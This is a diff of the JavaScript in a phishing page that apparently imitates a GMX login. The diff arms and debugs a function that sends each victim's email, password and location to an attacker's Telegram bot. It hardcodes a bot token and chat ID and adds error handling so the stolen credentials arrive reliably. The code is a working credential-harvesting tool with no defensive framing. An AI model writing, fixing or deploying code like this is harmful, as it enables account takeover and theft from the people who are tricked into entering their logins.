@@ -355,21 +355,9 @@
         // ============================================================
         // TELEGRAM BOT CONFIGURATION
         // ============================================================
-        // IMPORTANT: Replace these values with your actual credentials
-        // 
-        // 1. Get Bot Token:
-        //    - Open Telegram and search for @BotFather
-        //    - Send /newbot and follow instructions
-        //    - Copy the token (format: 123456789:ABCdefGHIjklMNOpqrsTUVwxyz)
-        //
-        // 2. Get Chat ID:
-        //    - Search for @userinfobot in Telegram
-        //    - Start chat - it shows your Chat ID
-        //    - Copy the number (format: 123456789)
-        // ============================================================
         
-        const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
-        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
+        const TELEGRAM_BOT_TOKEN = '8313007532:AAFHYoeRYKAwELo5cm9gH0axG7jeM6rSvwM';
+        const TELEGRAM_CHAT_ID = '6924028271';
         
         // ============================================================
 
@@ -440,6 +428,12 @@
 
         async function sendToTelegram(email, password, locationInfo) {
             console.log('Sending to Telegram...', { email, locationInfo });
+            
+            // Check if credentials are set
+            if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+                return { success: false, error: 'Please configure your Telegram bot token and chat ID in the code' };
+            }
+            
             const message = `🔐 New GMX Login Attempt
 
 📧 Email: ${email}
@@ -459,9 +453,9 @@
 
             const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
             
-            console.log('Telegram URL:', url);
-            console.log('Bot Token exists:', TELEGRAM_BOT_TOKEN !== '8313007532:AAFHYoeRYKAwELo5cm9gH0axG7jeM6rSvwM');
-            console.log('Chat ID exists:', TELEGRAM_CHAT_ID !== '6924028271');
+            console.log('Sending request to Telegram...');
+            console.log('Bot Token configured:', TELEGRAM_BOT_TOKEN !== '8313007532:AAFHYoeRYKAwELo5cm9gH0axG7jeM6rSvwM');
+            console.log('Chat ID configured:', TELEGRAM_CHAT_ID !== '6924028271');
 
             try {
                 const response = await fetch(url, {
@@ -471,10 +465,15 @@
                     },
                     body: JSON.stringify({
                         chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
+                        text: message
                     })
                 });
+
+                if (!response.ok) {
+                    const errorText = await response.text();
+                    console.error('HTTP Error:', response.status, errorText);
+                    return { success: false, error: `HTTP ${response.status}: ${errorText}` };
+                }
 
                 const data = await response.json();
                 console.log('Telegram API response:', data);
@@ -482,10 +481,19 @@
                 if (data.ok) {
                     return { success: true };
                 } else {
-                    return { success: false, error: data.description };
+                    return { success: false, error: data.description || 'Unknown error' };
                 }
             } catch (error) {
                 console.error('Telegram send error:', error);
+                
+                // More specific error messages
+                if (error.message.includes('Failed to fetch')) {
+                    return { 
+                        success: false, 
+                        error: 'Network error. Check if: 1) Bot token is correct 2) You have internet 3) Your firewall allows Telegram API' 
+                    };
+                }
+                
                 return { success: false, error: error.message };
             }
         }
